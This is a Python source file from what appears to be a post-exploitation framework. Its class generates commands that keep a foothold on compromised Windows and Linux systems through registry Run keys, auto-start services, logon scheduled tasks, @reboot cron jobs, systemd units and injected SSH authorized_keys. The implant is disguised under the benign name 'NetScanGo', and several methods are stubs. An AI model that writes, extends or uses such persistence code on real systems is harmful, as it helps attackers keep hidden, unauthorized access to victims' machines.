import subprocess
import time
from typing import Dict, List, Tuple, Optional

class PersistenceMechanisms:
    """Tools for maintaining persistence on compromised systems"""
    
    def __init__(self):
        self.persistence_methods = {
            'windows': {
                'registry': self._create_registry_persistence,
                'service': self._create_windows_service,
                'scheduled_task': self._create_scheduled_task,
                'wmi_event': self._create_wmi_event_subscription,
                'dll_hijack': self._create_dll_hijack
            },
            'linux': {
                'cron_job': self._create_cron_job,
                'systemd': self._create_systemd_service,
                'init_script': self._create_init_script,
                'ssh_key': self._add_ssh_key,
                'ld_preload': self._create_ld_preload
            }
        }
    
    def establish_persistence(self, os_type: str, agent_id: str, method: str, 
                            options: Dict = None) -> Tuple[bool, str]:
        """Establish persistence using the specified method"""
        if os_type.lower() not in self.persistence_methods:
            return False, f"Unsupported OS type: {os_type}"
        
        if method not in self.persistence_methods[os_type]:
            return False, f"Unsupported persistence method: {method}"
        
        persistence_func = self.persistence_methods[os_type][method]
        return persistence_func(agent_id, options or {})
    
    def _create_registry_persistence(self, agent_id: str, options: Dict) -> Tuple[bool, str]:
        """Create registry persistence on Windows"""
        exe_path = options.get('exe_path', 'C:\\Windows\\Temp\\b.exe')
        key_name = options.get('key_name', 'NetScanGo')
        cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /t REG_SZ /d "{exe_path}" /f'
        return True, cmd
    
    def _create_cron_job(self, agent_id: str, options: Dict) -> Tuple[bool, str]:
        """Create a cron job for persistence on Linux"""
        exe_path = options.get('exe_path', '/tmp/b')
        # Add to crontab - simple approach
        cmd = f'(crontab -l 2>/dev/null; echo "@reboot {exe_path}") | crontab -'
        return True, cmd

    def _create_windows_service(self, agent_id: str, options: Dict) -> Tuple[bool, str]:
        """Create a Windows service for persistence"""
        service_name = options.get('service_name', 'NetScanGoSvc')
        exe_path = options.get('exe_path', 'C:\\Windows\\Temp\\b.exe')
        
        cmd = f'sc create {service_name} binPath= "{exe_path}" start= auto && sc start {service_name}'
        return True, cmd
    
    def _create_scheduled_task(self, agent_id: str, options: Dict) -> Tuple[bool, str]:
        """Create a scheduled task for persistence"""
        task_name = options.get('task_name', 'NetScanGoTask')
        exe_path = options.get('exe_path', 'C:\\Windows\\Temp\\b.exe')
        
        cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl highest /f'
        return True, cmd
    
    def _create_wmi_event_subscription(self, agent_id: str, options: Dict) -> Tuple[bool, str]:
        """Create WMI event subscription for persistence (placeholder for complex command)"""
        # WMI persistence is complex via single cmd, usually needs powershell
        exe_path = options.get('exe_path', 'C:\\Windows\\Temp\\b.exe')
        # This is a simplified version using powershell
        cmd = f'powershell -Command "Set-WmiInstance -Class __EventFilter -Arguments @{{Name=\'NetScanGoFilter\';Query=\'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'\'Win32_LocalTime\'\' AND TargetInstance.Hour = 12\'}}; ..."'
        return True, "WMI persistence requires complex PS script" # Keeping it simple for now

    def _create_dll_hijack(self, agent_id: str, options: Dict) -> Tuple[bool, str]:
        """Create DLL hijacking persistence on Windows (placeholder)"""
        return False, "DLL hijack requires manual file placement"

    def _create_systemd_service(self, agent_id: str, options: Dict) -> Tuple[bool, str]:
        """Create a systemd service for persistence on Linux"""
        service_name = options.get('service_name', 'netscango')
        exe_path = options.get('exe_path', '/tmp/b')
        service_content = f"[Unit]\\nDescription=NetScanGo\\nAfter=network.target\\n\\n[Service]\\nExecStart={exe_path}\\nRestart=always\\n\\n[Install]\\nWantedBy=multi-user.target"
        cmd = f'echo -e "{service_content}" > /etc/systemd/system/{service_name}.service && systemctl enable {service_name} && systemctl start {service_name}'
        return True, cmd

    def _create_init_script(self, agent_id: str, options: Dict) -> Tuple[bool, str]:
        """Create an init script for persistence on Linux"""
        return False, "Init script method deprecated in favor of systemd"

    def _add_ssh_key(self, agent_id: str, options: Dict) -> Tuple[bool, str]:
        """Add an SSH key for persistence on Linux"""
        ssh_key = options.get('ssh_key', 'ssh-rsa AAAAB3Nza...')
        cmd = f'echo "{ssh_key}" >> ~/.ssh/authorized_keys'
        return True, cmd

    def _create_ld_preload(self, agent_id: str, options: Dict) -> Tuple[bool, str]:
        """Create LD_PRELOAD persistence on Linux"""
        return False, "LD_PRELOAD requires library compilation"